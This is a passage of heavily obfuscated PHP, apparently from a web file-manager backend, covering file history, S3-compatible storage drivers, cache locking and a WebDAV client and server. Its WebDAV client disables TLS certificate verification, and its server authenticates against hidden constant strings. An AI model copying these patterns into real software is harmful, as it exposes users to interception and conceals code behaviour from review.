Model($dã¹ªÏçÆ·[23])->remove($eÉÊÂ‚é·); goto Fº©Æ´ƒ»’; Fº©Æ´ƒ»’: } public function listData($AéÇ¿¢Ô›Ù) { goto D‚ÀÃÇ–ˆ»; d”å¹œŸˆ: $CÏ‘Ì™ÙŒ° = $this->field($Fë…ÏÛ¬†)->where($D‘ç×Ø˜µÖ)->order($c®Ç¡‹ÖÈÆ[18])->selectPage(); $this->_listAppendUser($CÏ‘Ì™ÙŒ°[$c®Ç¡‹ÖÈÆ[25]]); $aç¤„ÓÏØ = Model($c®Ç¡‹ÖÈÆ[11])->get($c®Ç¡‹ÖÈÆ[12]); goto E“Ö–ì‡ğÎ; E“Ö–ì‡ğÎ: if ($aç¤„ÓÏØ == $c®Ç¡‹ÖÈÆ[13]) { $CÏ‘Ì™ÙŒ°[$c®Ç¡‹ÖÈÆ[25]] = array_slice($CÏ‘Ì™ÙŒ°[$c®Ç¡‹ÖÈÆ[25]], 0, 3); $CÏ‘Ì™ÙŒ°[$c®Ç¡‹ÖÈÆ[26]] = array($c®Ç¡‹ÖÈÆ[27] => 1, $c®Ç¡‹ÖÈÆ[28] => 20, $c®Ç¡‹ÖÈÆ[29] => 1, $c®Ç¡‹ÖÈÆ[30] => 3); } return $CÏ‘Ì™ÙŒ°; goto B‡¬ÆŒŒÅ; D‚ÀÃÇ–ˆ»: $c®Ç¡‹ÖÈÆ =& $_SERVER[¶Ù˜]; $D‘ç×Ø˜µÖ = array($c®Ç¡‹ÖÈÆ[0] => $AéÇ¿¢Ô›Ù); $Fë…ÏÛ¬† = $c®Ç¡‹ÖÈÆ[24]; goto d”å¹œŸˆ; B‡¬ÆŒŒÅ: } protected function _listAppendUser(&$d¿òÆ†Š¿§) { $FŒÈ«©‡ô =& $_SERVER[¶Ù˜]; $c¸ÖœÅæøÅ = array_to_keyvalue($d¿òÆ†Š¿§, $FŒÈ«©‡ô[19], $FŒÈ«©‡ô[31]); $bİ°ĞÜ¼‚ = Model($FŒÈ«©‡ô[32])->userListInfo($c¸ÖœÅæøÅ); foreach ($d¿òÆ†Š¿§ as &$EÊäÇÂê¾ ) { $e¤è£¶¼¾‚ = $EÊäÇÂê¾ [$FŒÈ«©‡ô[31]]; $EÊäÇÂê¾ [$FŒÈ«©‡ô[4]] = $bİ°ĞÜ¼‚[$e¤è£¶¼¾‚] ? $bİ°ĞÜ¼‚[$e¤è£¶¼¾‚] : !1; } } public function fileInfo($AÚÚ¦àÃ¢ò) { $BË‘‰ÍÃÊ¹ =& $_SERVER[¶Ù˜]; $B‘Ş—ŒÙø‹ = $this->tablePrefix; $fàšææÇÓÙ = "{$B‘Ş—ŒÙø‹}\151\157\x5f\146\x69\x6c\145\x20\146\x69\x6c\x65\x73\40\x6f\x6e\x20\146\x69\154\145\163\x2e\146\151\154\145\111\104\40\75\x20\150\x69\163\164\157\x72\171\x2e\146\151\154\x65\111\104"; return $this->alias($BË‘‰ÍÃÊ¹[33])->where(array($BË‘‰ÍÃÊ¹[21] => $AÚÚ¦àÃ¢ò))->join($fàšææÇÓÙ, $BË‘‰ÍÃÊ¹[34])->find(); } public function removeItem($B¼œÉøÎÊ‡) { $b×‰“©¤ã =& $_SERVER[¶Ù˜]; $a¡¹å· Ç = array($b×‰“©¤ã[21] => $B¼œÉøÎÊ‡); $Bì·ñßŠÈ = $this->where($a¡¹å· Ç)->find(); if ($Bì·ñßŠÈ) { $F³‘µŞ»åÓ = $this->where($a¡¹å· Ç)->delete(); Model($b×‰“©¤ã[23])->remove($Bì·ñßŠÈ[$b×‰“©¤ã[6]]); return $F³‘µŞ»åÓ; } return !1; } public function removeBySource($eá¥µ°­ÁÑ) { goto CÏ¦Ä«ïœ; FÖíŞé¢ÆÈ: $F¥° íƒÛë = array($f¼¤Ï°ì­«[0] => array($f¼¤Ï°ì­«[22], $eá¥µ°­ÁÑ)); $f¡çÑöì£ = $this->field($f¼¤Ï°ì­«[5])->where($F¥° íƒÛë)->select(); if ($f¡çÑöì£) { $this->where($F¥° íƒÛë)->delete(); $B½‚¢½Õï = array_to_keyvalue($f¡çÑöì£, $f¼¤Ï°ì­«[19], $f¼¤Ï°ì­«[6]); Model($f¼¤Ï°ì­«[23])->remove($B½‚¢½Õï); } goto Fˆô•‡ÑÂè; Fˆô•‡ÑÂè: return !0; goto Bíø¡•¸ÒÁ; CÏ¦Ä«ïœ: $f¼¤Ï°ì­« =& $_SERVER[¶Ù˜]; if (!$eá¥µ°­ÁÑ) { return !1; } if (!is_array($eá¥µ°­ÁÑ)) { $eá¥µ°­ÁÑ = array($eá¥µ°­ÁÑ); } goto FÖíŞé¢ÆÈ; Bíø¡•¸ÒÁ: } public function setDetail($eŒøÚÄÆ‹, $e®Õ»‡ïˆ) { $b—ŸÊã·¥ =& $_SERVER[¶Ù˜]; return $this->where(array($b—ŸÊã·¥[21] => $eŒøÚÄÆ‹))->save(array($b—ŸÊã·¥[9] => $e®Õ»‡ïˆ)); } public function rollbackToItem($d„¡²­¶±™, $E°å½¥ºä°) { goto B¯•”‘ˆÆœ; E¢÷‘Š³„¿: $f”«Àº¾ö = $this->find($E°å½¥ºä°); $dƒ‡á„Í = array($cÊñ‰¦‹Óƒ[6] => $f”«Àº¾ö[$cÊñ‰¦‹Óƒ[6]], $cÊñ‰¦‹Óƒ[8] => $f”«Àº¾ö[$cÊñ‰¦‹Óƒ[8]], $cÊñ‰¦‹Óƒ[36] => time(), $cÊñ‰¦‹Óƒ[3] => USER_ID); Model($cÊñ‰¦‹Óƒ[35])->where(array($cÊñ‰¦‹Óƒ[1] => $d„¡²­¶±™))->save($dƒ‡á„Í); goto dÇ±Ş–áÔÔ; B¯•”‘ˆÆœ: $cÊñ‰¦‹Óƒ =& $_SERVER[¶Ù˜]; $cåë×İ— = Model($cÊñ‰¦‹Óƒ[35])->sourceInfo($d„¡²­¶±™); $this->addHistory($cåë×İ—); goto E¢÷‘Š³„¿; dÇ±Ş–áÔÔ: return $this->where(array($cÊñ‰¦‹Óƒ[21] => $E°å½¥ºä°))->delete(); goto a’‡ğÆ³õæ; a’‡ğÆ³õæ: } public function clearSame($EÇëßø³Û) { goto CÀ ¹¸¯–Ì; CÀ ¹¸¯–Ì: $a³··«´‡¤ =& $_SERVER[¶Ù˜]; $Cà–ìæìœ  = $this->listData($EÇëßø³Û); $Bë¬ÃŸà¢Ç = array_to_keyvalue_group($Cà–ìæìœ , $a³··«´‡¤[6]); goto BêŠ¯¢Œ†; cÆ¨ñğ†é: if (!$Aó”£¦áÉ) { return; } $this->where(array($a³··«´‡¤[20] => array($a³··«´‡¤[22], $Aó”£¦áÉ)))->delete(); Model($a³··«´‡¤[23])->remove($f”ÊÊ…ß·µ); goto c¨‰—´™›ƒ; BêŠ¯¢Œ†: $f”ÊÊ…ß·µ = array(); $Aó”£¦áÉ = array(); foreach ($Bë¬ÃŸà¢Ç as $D°Î Ğ¢ÈÁ) { if (count($D°Î Ğ¢ÈÁ) <= 1) { continue; } foreach ($D°Î Ğ¢ÈÁ as $dÖ¬äö) { $f”ÊÊ…ß·µ[] = $dÖ¬äö[$a³··«´‡¤[6]]; $Aó”£¦áÉ[] = $dÖ¬äö[$a³··«´‡¤[20]]; } } goto cÆ¨ñğ†é; c¨‰—´™›ƒ: } public function userSpace() { $D´Ã™•´Òã =& $_SERVER[¶Ù˜]; $dÈ†¤º  = $this->tablePrefix; $e˜”áïÓÚÖ = array($D´Ã™•´Òã[2] => USER_ID); $D Ê‡Öñãª = "{$dÈ†¤º }\x69\x6f\137\146\x69\x6c\145\40\146\151\154\x65\163\x20\157\x6e\40\x66\x69\154\x65\163\x2e\146\151\154\145\x49\x44\x20\x3d\x20\150\151\163\164\x6f\x72\x79\56\x66\x69\x6c\x65\x49\104"; return $this->alias($D´Ã™•´Òã[33])->where($e˜”áïÓÚÖ)->join($D Ê‡Öñãª, $D´Ã™•´Òã[34])->sum($D´Ã™•´Òã[8]); } } goto dßõáÏ¾Ú; AÈ¢òÉ´²â: class PathDriverMOSS extends PathDriverBaseS3 { public function __construct($CâÁ­©˜¬) { parent::__construct($CâÁ­©˜¬); $this->signatureVersion($_SERVER[İåâé¾][199]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function copyFile($FÅ»ƒ¹¿ó, $Aëí„–Ê»‹, $c„Íé´‡× = array()) { $Eˆİé¡“” = $this->tempFile($FÅ»ƒ¹¿ó); $this->download($FÅ»ƒ¹¿ó, $Eˆİé¡“”); $D‹Ö‡‹åøŠ = $this->upload($Aëí„–Ê»‹, $Eˆİé¡“”); $this->tempFileRemve($Eˆİé¡“”); return $D‹Ö‡‹åøŠ; } public function uploadFormData($céÎ¬Î­‘, $A„ñù¤ê¹Û = 3600) { return parent::uploadFormData($céÎ¬Î­‘, $A„ñù¤ê¹Û); } public function fileOut($aìÊ‡•±÷ç, $A‹§Í¼¶¬ = false, $BùÇöÒŸÏÙ = false, $EŸ¬î±›„ = '') { parent::fileOutServer($aìÊ‡•±÷ç, $A‹§Í¼¶¬, $BùÇöÒŸÏÙ, $EŸ¬î±›„); } public function fileOutLink($eÆµ…Û¯¤) { header($_SERVER[İåâé¾][152] . $eÆµ…Û¯¤); die; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($FîŸäñ×¸¤) { parent::__construct($FîŸäñ×¸¤); $this->signatureVersion($_SERVER[İåâé¾][199]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function isFolder($FâªİÉ¹‘­) { $EŒÊíˆ–‹ê =& $_SERVER[İåâé¾]; $FâªİÉ¹‘­ = trim($FâªİÉ¹‘­, $EŒÊíˆ–‹ê[8]); if (!empty($FâªİÉ¹‘­)) { $FâªİÉ¹‘­ .= $EŒÊíˆ–‹ê[8]; } if ($this->getObjectInfo($FâªİÉ¹‘­)) { return !0; } return parent::isFolder($FâªİÉ¹‘­); } public function fileOutLink($D§°Å­Ìó) { header($_SERVER[İåâé¾][152] . $D§°Å­Ìó); die; } } class PathDriverNOS extends PathDriverBaseS3 { public function __construct($fä´“Õ¡¥á) { parent::__construct($fä´“Õ¡¥á); $this->client->setSignatureVersion($_SERVER[İåâé¾][199]); } public function setBucketCors() { return !1; } public function getBucketCors() { return !1; } public function isBucketCors() { return !0; } public function isFolder($bÄ…¼ä¾Òİ) { goto E¨İŸ»´ù; E¨İŸ»´ù: $DÑèƒë»†§ =& $_SERVER[İåâé¾]; $bÄ…¼ä¾Òİ = trim($bÄ…¼ä¾Òİ, $DÑèƒë»†§[8]); if (!empty($bÄ…¼ä¾Òİ)) { $bÄ…¼ä¾Òİ .= $DÑèƒë»†§[8]; } goto bªÊ„ÃÄ‡ê; bªÊ„ÃÄ‡ê: $A¶áµ—Ğª = $this->getObjectInfo($bÄ…¼ä¾Òİ); if ($A¶áµ—Ğª) { return !0; } $cªç±¬Ä¦ = $this->listObjs($bÄ…¼ä¾Òİ, null, 3, $DÑèƒë»†§[8]); goto FçÅòÛù¨É; FçÅòÛù¨É: return count($cªç±¬Ä¦) == 1 ? !1 : !0; goto bÉÎ¹›ò¬®; bÉÎ¹›ò¬®: } public function fileInfoImage($f¶‹§”ÂêÊ, &$a‰‚å¾) { } public function setContent($aî†çÛÛØ», $d¢Ä˜ÑÔâ = '', $aâÜãšÔˆ = false) { $e´ì¾ğˆ±Ø =& $_SERVER[İåâé¾]; $aî†çÛÛØ» = $aâÜãšÔˆ ? trim($aî†çÛÛØ», $e´ì¾ğˆ±Ø[8]) . $e´ì¾ğˆ±Ø[8] : $aî†çÛÛØ»; $b¾Èİ‹ÀÇ¼ = get_file_mime(get_path_ext($aî†çÛÛØ»)); $C¯ùÊ‘Œ = $this->client->putObject($d¢Ä˜ÑÔâ, $this->bucket, $aî†çÛÛØ», $e´ì¾ğˆ±Ø[181], array(), $b¾Èİ‹ÀÇ¼); return $C¯ùÊ‘Œ ? !0 : !1; } public function getObjectInfo($bõÂ’õ§) { $FäÓÙŞ×Ä– =& $_SERVER[İåâé¾]; $e’ß«ñçóù = $this->client->getObjectInfo($this->bucket, $bõÂ’õ§); if (!isset($e’ß«ñçóù[$FäÓÙŞ×Ä–[206]]) && isset($e’ß«ñçóù[$FäÓÙŞ×Ä–[900]])) { $e’ß«ñçóù[$FäÓÙŞ×Ä–[206]] = $e’ß«ñçóù[$FäÓÙŞ×Ä–[900]]; } return $e’ß«ñçóù; } public function upload($b©ëßƒ¬ù², $dØ£Ø‰‡Ü, $d‘–ƒÇ­ = false, $aË„·™åÉ = REPEAT_REPLACE) { $C°µ¢¼œÚ‘ =& $_SERVER[İåâé¾]; $fÍâĞÚÆÂë = array(); $a»Êº“Ë­ë = array($C°µ¢¼œÚ‘[198] => get_file_mime(get_path_ext($b©ëßƒ¬ù²))); if (IO::size($dØ£Ø‰‡Ü) <= 1024 * 1024 * 200) { $BÎ”„‰®ç§ = $this->client->putObjectFile($dØ£Ø‰‡Ü, $this->bucket, $b©ëßƒ¬ù², $C°µ¢¼œÚ‘[181], $fÍâĞÚÆÂë, $a»Êº“Ë­ë); return !empty($BÎ”„‰®ç§) ? !0 : !1; } $EŞ³¶Ÿ“»Œ = $this->client->multiUploadObject($dØ£Ø‰‡Ü, $this->bucket, trim($b©ëßƒ¬ù², $C°µ¢¼œÚ‘[8]), $fÍâĞÚÆÂë, $a»Êº“Ë­ë); return $EŞ³¶Ÿ“»Œ ? $this->getPathOuter($b©ëßƒ¬ù²) : !1; } public function blockChain($F…Ú§ÎÆóò, $bŒöà×¤‚) { $cŠº»’¯™¢ =& $_SERVER[İåâé¾]; $D¼îÀöØ•¾ = $this->getObjectInfo($F…Ú§ÎÆóò); if (!$D¼îÀöØ•¾) { return !1; } return $this->client->copyObject($this->bucket, $F…Ú§ÎÆóò, $this->bucket, $F…Ú§ÎÆóò, $cŠº»’¯™¢[181], array(), $bŒöà×¤‚, $cŠº»’¯™¢[901], !0); } } goto D‰ºÛÌÎøÒ; CÕ¡Ù­–×µ: class CacheLock { protected static $handle; protected static $timeout; protected static $lockItem = array(); public static function init() { goto e˜ºøİš¦“; a’­¨†‡Û†: self::$timeout = $Dè³—¸«—‹[$E‘‰®Ÿ‹À[534]] ? $Dè³—¸«—‹[$E‘‰®Ÿ‹À[534]] : 10; $E³•ñŸæß» = $GLOBALS[$E‘‰®Ÿ‹À[6]][$E‘‰®Ÿ‹À[17]][$E‘‰®Ÿ‹À[490]]; if ($Dè³—¸«—‹[$E‘‰®Ÿ‹À[522]] == $E‘‰®Ÿ‹À[17] && $E³•ñŸæß» == $E‘‰®Ÿ‹À[9]) { $Dè³—¸«—‹[$E‘‰®Ÿ‹À[522]] = $E‘‰®Ÿ‹À[163]; } goto a†Íáİ²²; e˜ºøİš¦“: $E‘‰®Ÿ‹À =& $_SERVER[İåâé¾]; if (self::$handle) { return self::$handle; } $Dè³—¸«—‹ = $GLOBALS[$E‘‰®Ÿ‹À[6]][$E‘‰®Ÿ‹À[340]]; goto a’­¨†‡Û†; a†Íáİ²²: switch ($Dè³—¸«—‹[$E‘‰®Ÿ‹À[522]]) { case $E‘‰®Ÿ‹À[525]: self::$handle = new CacheLockRedis(); break; case $E‘‰®Ÿ‹À[526]: self::$handle = new CacheLockMemcached(); break; case $E‘‰®Ÿ‹À[17]: self::$handle = new CacheLockDatabase(); break; case $E‘‰®Ÿ‹À[163]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto D©ƒŒŒšÒÜ; D©ƒŒŒšÒÜ: } private static function key($f°Úò“«Šó) { return $_SERVER[İåâé¾][535] . Cache::key($f°Úò“«Šó); } public static function initReset() { self::$handle = !1; } public static function lockGlobal($cÓ„­Ä„¶İ, $Bî†ëØÖ) { return self::lock($cÓ„­Ä„¶İ, $Bî†ëØÖ, !0); } public static function lock($cÑğÔÌŒù¬, $bÃÍµêÉ“¢ = false, $F¶­ñîƒºœ = false) { goto DèÔÆÏÒ”; DèÔÆÏÒ”: $a›ÓŒÉ¹¹ =& $_SERVER[İåâé¾]; $aá¿»ÛÔ÷Î = self::init(); $cÑğÔÌŒù¬ = self::key($cÑğÔÌŒù¬); goto cÂ»À°à‚Ù; E‡Ø¹äò˜è: if (!$C½š“«¶Ç) { write_log($a›ÓŒÉ¹¹[536] . (timeFloat() - $d“˜ÇÌ†) . $a›ÓŒÉ¹¹[68] . get_caller_msg(), $a›ÓŒÉ¹¹[537]); show_json("\114\x6f\143\x6b\40\x61\143\x74\x69\x6f\156\72\x20{$cÑğÔÌŒù¬}\x20\x74\151\155\x65\x6f\165\164\x2c\x6f\x76\x65\162\40{$bÃÍµêÉ“¢}\x20\163", !1); } if (!$F¶­ñîƒºœ) { self::$lockItem[$cÑğÔÌŒù¬] = !0; } return $C½š“«¶Ç; goto d™Ã¡áá®; cÂ»À°à‚Ù: $d“˜ÇÌ† = timeFloat(); $bÃÍµêÉ“¢ = $bÃÍµêÉ“¢ ? $bÃÍµêÉ“¢ : self::$timeout; $C½š“«¶Ç = $aá¿»ÛÔ÷Î->lock($cÑğÔÌŒù¬, $bÃÍµêÉ“¢); goto E‡Ø¹äò˜è; d™Ã¡áá®: } public static function unlock($B´îÇ©ß•) { $B´îÇ©ß• = self::key($B´îÇ©ß•); self::$lockItem[$B´îÇ©ß•] = null; return self::init()->unlock($B´îÇ©ß•); } public static function unlockRuntime() { $CÇ…¡­¾ø = self::$lockItem; $E³Í’Ò˜µ§ = self::init(); foreach ($CÇ…¡­¾ø as $bé¯–³ÈÓ† => $E‹•Ë©òÇŞ) { if ($E‹•Ë©òÇŞ) { $E³Í’Ò˜µ§->unlock($bé¯–³ÈÓ†); } } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Dˆğã¾é“ =& $_SERVER[İåâé¾]; $Fá‡ËÅèé™ = $GLOBALS[$Dˆğã¾é“[6]][$Dˆğã¾é“[340]]; self::$cachePath = $Fá‡ËÅèé™[$Dˆğã¾é“[163]][$Dˆğã¾é“[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($A¢Ú—ˆ“Ş±, $C‹î‘½ÊÁ = 0) { goto bãÂ±®®çÁ; bãÂ±®®çÁ: $eÅ¹¢‹½ó« =& $_SERVER[İåâé¾]; $AƒƒÜŸÜ›à = microtime(!0); $fğÈÏĞ„ØÇ = $AƒƒÜŸÜ›à + $C‹î‘½ÊÁ + 0.0001; goto C‰÷’êÇ—Á; fœÉ’´Ôî: $this->unlock($A¢Ú—ˆ“Ş±); return !1; goto e–Ÿ—’µ’Á; C‰÷’êÇ—Á: $FÚÖ ö“Õ = rtrim(self::$cachePath, $eÅ¹¢‹½ó«[8]) . $eÅ¹¢‹½ó«[538] . md5($A¢Ú—ˆ“Ş±) . $eÅ¹¢‹½ó«[539]; if (file_exists($FÚÖ ö“Õ) && filemtime($FÚÖ ö“Õ) && filemtime($FÚÖ ö“Õ) < time() - 10) { @unlink($FÚÖ ö“Õ); } do { if (file_exists($FÚÖ ö“Õ)) { cacheLockWait(); continue; } $aÃ˜®ŠÙå = fopen($FÚÖ ö“Õ, $eÅ¹¢‹½ó«[540]); $A‡‡¨íó¬ = flock($aÃ˜®ŠÙå, LOCK_EX | LOCK_NB); self::$caches[$A¢Ú—ˆ“Ş±] = array($eÅ¹¢‹½ó«[541] => $aÃ˜®ŠÙå, $eÅ¹¢‹½ó«[163] => $FÚÖ ö“Õ); fwrite($aÃ˜®ŠÙå, $fğÈÏĞ„ØÇ); clearstatcache(); if ($aÃ˜®ŠÙå && $A‡‡¨íó¬) { return !0; } cacheLockWait(); } while (microtime(!0) < $fğÈÏĞ„ØÇ); goto fœÉ’´Ôî; e–Ÿ—’µ’Á: } public function unlock($bÄæ¢ê‡ñ‡) { goto EÑ¦‘°©¨½; EÑ¦‘°©¨½: $aÀùô×À‹Ş =& $_SERVER[İåâé¾]; $FŞ¯Øğ¬ø = self::$caches[$bÄæ¢ê‡ñ‡]; if (!$FŞ¯Øğ¬ø) { return; } goto fùöµ‰¨Œ; fùöµ‰¨Œ: @flock($FŞ¯Øğ¬ø[$aÀùô×À‹Ş[541]], LOCK_UN); @fclose($FŞ¯Øğ¬ø[$aÀùô×À‹Ş[541]]); @unlink($FŞ¯Øğ¬ø[$aÀùô×À‹Ş[163]]); goto e°³£ÛÈ†ˆ; e°³£ÛÈ†ˆ: unset(self::$caches[$bÄæ¢ê‡ñ‡]); goto fğç©Œ‡¿—; fğç©Œ‡¿—: } } goto Dßœ„°ïŞŒ; aÇ„˜»íÀÖ: class HttpDavClient { public function __construct($cÌã“öõÎ , $cÚ‹¦ˆ¿, $A½÷‰İŒÒ™) { $this->header = array(); $this->userName = $cÚ‹¦ˆ¿; $this->userPassowrd = $A½÷‰İŒÒ™; } protected function makePath($d÷¶Ñ™ƒè) { return $d÷¶Ñ™ƒè; } protected function setHeader($D³±â¦Í„, $cÇ†¢Àíƒ¡ = false) { if ($cÇ†¢Àíƒ¡ === !1) { $this->header[] = $D³±â¦Í„; } else { $this->header[] = $D³±â¦Í„ . $_SERVER[İåâé¾][646] . $cÇ†¢Àíƒ¡; } } public function move($c÷åĞ‘Ø§Ù, $b«Õƒ§ïË…, $b²µˆÖá•‹ = '') { $EøàÀ‡ =& $_SERVER[İåâé¾]; $this->setHeader($EøàÀ‡[1192], $this->makePath($b«Õƒ§ïË…)); $this->setHeader($EøàÀ‡[1193], $EøàÀ‡[1194]); if ($b²µˆÖá•‹) { $this->setHeader($EøàÀ‡[1195], $EøàÀ‡[691] . $b²µˆÖá•‹ . $EøàÀ‡[694]); } return $this->send($EøàÀ‡[1196], $c÷åĞ‘Ø§Ù); } public function copy($bŠø¡Ú¹‡æ, $cùŠÊğ¥£“) { $eÖº‹ñâªå =& $_SERVER[İåâé¾]; $this->setHeader($eÖº‹ñâªå[1192], $this->makePath($cùŠÊğ¥£“)); $this->setHeader($eÖº‹ñâªå[1193], $eÖº‹ñâªå[1194]); return $this->send($eÖº‹ñâªå[1197], $bŠø¡Ú¹‡æ); } public function mkcol($bâàƒÇŞÒ) { $CĞí‹çÓ¹¶ =& $_SERVER[İåâé¾]; $this->setHeader($CĞí‹çÓ¹¶[1193], $CĞí‹çÓ¹¶[1194]); return $this->send($CĞí‹çÓ¹¶[1198], $bâàƒÇŞÒ); } public function delete($dˆ›‰¿òÕ, $eÑò™¸˜à“ = '') { $AŸí—×‚Ô =& $_SERVER[İåâé¾]; if ($eÑò™¸˜à“) { $this->setHeader($AŸí—×‚Ô[1195], $AŸí—×‚Ô[691] . $eÑò™¸˜à“ . $AŸí—×‚Ô[694]); } return $this->send($AŸí—×‚Ô[1199], $dˆ›‰¿òÕ); } public function propfind($D¤‚„´è›º) { $eÅ×·‡½ô‚ =& $_SERVER[İåâé¾]; $this->setHeader($eÅ×·‡½ô‚[1200], $eÅ×·‡½ô‚[376]); $this->setHeader($eÅ×·‡½ô‚[1201], $eÅ×·‡½ô‚[1202]); $e¹ µç… = $eÅ×·‡½ô‚[1203]; return $this->send($eÅ×·‡½ô‚[1204], $D¤‚„´è›º, $e¹ µç…); } public function options($Fà§§õã») { return $this->send($_SERVER[İåâé¾][1205], $Fà§§õã»); } public function get($fÃÍÎ÷ãÙÂ) { return $this->send($_SERVER[İåâé¾][222], $fÃÍÎ÷ãÙÂ); } public function put($f¶¨õœ®ó‘, $d‰”¼«‹Œš, $dğ‹·õã‚ = '') { $Aïö³˜®ê =& $_SERVER[İåâé¾]; if ($dğ‹·õã‚) { $this->setHeader($Aïö³˜®ê[1195], $Aïö³˜®ê[691] . $dğ‹·õã‚ . $Aïö³˜®ê[694]); } return $this->send($Aïö³˜®ê[220], $f¶¨õœ®ó‘, $d‰”¼«‹Œš); } protected function send($e²Ï«´“ª, $cóÛÉ«³„Î, $A´Ê¿‹Öæ = false, $A ŒªÂé¬ = false) { goto AàáŒ¼ó; B‹·éŞí‚ô: $a×Ááãš‚× = curl_init($cóÛÉ«³„Î); curl_setopt($a×Ááãš‚×, CURLOPT_CUSTOMREQUEST, $e²Ï«´“ª); curl_setopt($a×Ááãš‚×, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto bÒâ­Ä¦Â; AàáŒ¼ó: $f´ô¼»º·¥ =& $_SERVER[İåâé¾]; $E¨¨Œğ´‘é = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($f´ô¼»º·¥[1206], $f´ô¼»º·¥[50]); goto døÜ ‚â°; døÜ ‚â°: $this->setHeader($E¨¨Œğ´‘é); if ($A´Ê¿‹Öæ) { $A´Ê¿‹Öæ = $f´ô¼»º·¥[1207] . $A´Ê¿‹Öæ; } if (!request_url_safe($cóÛÉ«³„Î)) { return !1; } goto B‹·éŞí‚ô; Cáä©Ú˜ƒ§: curl_setopt($a×Ááãš‚×, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($a×Ááãš‚×, CURLOPT_SSL_VERIFYHOST, !1); $aËšÜÁ§” = curl_exec($a×Ááãš‚×); goto a‡™ø‚æ©Œ; bÒâ­Ä¦Â: curl_setopt($a×Ááãš‚×, CURLOPT_HTTPHEADER, $this->header); curl_setopt($a×Ááãš‚×, CURLOPT_RETURNTRANSFER, !0); curl_setopt($a×Ááãš‚×, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto Cáä©Ú˜ƒ§; a‡™ø‚æ©Œ: $this->header = array(); return $aËšÜÁ§”; goto BˆØ­†É©ä; BˆØ­†É©ä: } } class HttpDavServer { public function __construct($B›ç®ãÍ‡”, $Céñ‹ÆŒ´¿) { $this->root = $B›ç®ãÍ‡”; $this->initPath($Céñ‹ÆŒ´¿); $this->start(); } public function initPath($BƒîÌÉÄë) { $d”å‚ÑŸÌ =& $_SERVER[İåâé¾]; $bµ¢ã½ÅÔ = rtrim($_SERVER[$d”å‚ÑŸÌ[437]], $d”å‚ÑŸÌ[8]) . $d”å‚ÑŸÌ[8]; $this->urlBase = substr($bµ¢ã½ÅÔ, 0, strpos($bµ¢ã½ÅÔ, $BƒîÌÉÄë) + 1); $this->urlBase = rtrim($this->urlBase, $d”å‚ÑŸÌ[8]) . $BƒîÌÉÄë; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $cô¾¼šº´† =& $_SERVER[İåâé¾]; $b›õ±‚˜·Ë = HttpAuth::get(); if ($b›õ±‚˜·Ë[$cô¾¼šº´†[416]] == $cô¾¼šº´†[1208] && $b›õ±‚˜·Ë[$cô¾¼šº´†[663]] == $cô¾¼šº´†[1209]) { return !0; } HttpAuth::error(); } public function start() { goto BÜòÛö¦¹; a¾ô¨‚È‹: if (!method_exists($this, $BÏäùŸ„Ÿº)) { pr($BÏäùŸ„Ÿº . $aÆöŸùŸ›[1210]); die; } $A›Ø—ÕÜÑí = array($aÆöŸùŸ›[1211], $aÆöŸùŸ›[1212]); if (!in_array($BÏäùŸ„Ÿº, $A›Ø—ÕÜÑí) && !$this->pathExists($this->path)) { $c„´›®ğ™Š = array($aÆöŸùŸ›[780] => 404); } else { $c„´›®ğ™Š = $this->{$BÏäùŸ„Ÿº}(); } goto DÆîñÔ§—; BÜòÛö¦¹: $aÆöŸùŸ› =& $_SERVER[İåâé¾]; $this->checkUser(); $BÏäùŸ„Ÿº = $aÆöŸùŸ›[140] . HttpHeader::method(); goto a¾ô¨‚È‹; DÆîñÔ§—: if (!$c„´›®ğ™Š) { return; } self::response($c„´›®ğ™Š); goto F––Û†·§Ş; F––Û†·§Ş: } public function pathGet($B°®¼Ìª… = false) { $Aã‘õÛÚ©± =& $_SERVER[İåâé¾]; $Bºƒ‚µªÆŸ = $B°®¼Ìª… ? $_SERVER[$Aã‘õÛÚ©±[1213]] : $_SERVER[$Aã‘õÛÚ©±[437]]; $Bºƒ‚µªÆŸ = KodIO::clear(rawurldecode($Bºƒ‚µªÆŸ)); if (!strstr($Bºƒ‚µªÆŸ, KodIO::clear($this->urlBase))) { return !1; } return substr($Bºƒ‚µªÆŸ, strpos($Bºƒ‚µªÆŸ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($CèÓâÃ¥‘½) { return file_exists($CèÓâÃ¥‘½); } public function pathMkdir($FÀ²¢œ ˜î) { return mkdir($FÀ²¢œ ˜î, 511, !0); } public function pathInfo($E£ÃŠËÍª) { return path_info($E£ÃŠËÍª); } public function pathList($f‡ê‡ÍÁğš) { return path_list($f‡ê‡ÍÁğš); } public function pathOut($b„¸£²Ó¿¢) { echo file_get_contents($b„¸£²Ó¿¢); } public function pathPut($eÁˆæõå, $E•Ø²†Ôãè = '') { if (!$E•Ø²†Ôãè) { return file_put_contents($eÁˆæõå, $_SERVER[İåâé¾][33]); } return move_path($E•Ø²†Ôãè, $eÁˆæõå); } public function pathRemove($E§Å¯‡ß¶ö) { if (is_file($E§Å¯‡ß¶ö)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($bæãøŞ¥À‹, $bÙµÆê¤÷š) { return move_path($bæãøŞ¥À‹, $bÙµÆê¤÷š); } public function pathCopy($Eá‹œšãˆ¦, $C©í‚»½¬´) { return copy_dir($Eá‹œšãˆ¦, $C©í‚»½¬´); } public function parsePath($eÕĞÍíÀä¾) { return $eÕĞÍíÀä¾; } public function parseItem($Aäå‘¦Èƒ) { goto DË«Ìë„Á×; e™ŸØ šè: return $eµèôè¿; goto b«Ü¦œ©; DË«Ìë„Á×: $A²°†•âÕ =& $_SERVER[İåâé¾]; $bÕª¼ËË¡¢ = $this->pathGet() . $A²°†•âÕ[8] . $Aäå‘¦Èƒ[$A²°†•âÕ[28]]; $bÕª¼ËË¡¢ = str_replace($A²°†•âÕ[168], $A²°†•âÕ[8], rawurlencode($bÕª¼ËË¡¢)); goto 